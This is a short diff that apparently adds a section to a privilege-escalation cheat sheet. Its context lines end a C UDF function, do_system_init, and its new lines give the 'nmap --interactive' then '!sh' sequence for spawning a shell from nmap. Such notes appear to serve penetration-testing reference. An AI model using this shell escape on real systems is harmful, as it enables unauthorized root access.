@@ -606,3 +606,10 @@ char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
 	return(0);
 }
 ```
+
+### nmap privilege escalation
+
+```
+nmap --interactive
+!sh
+```
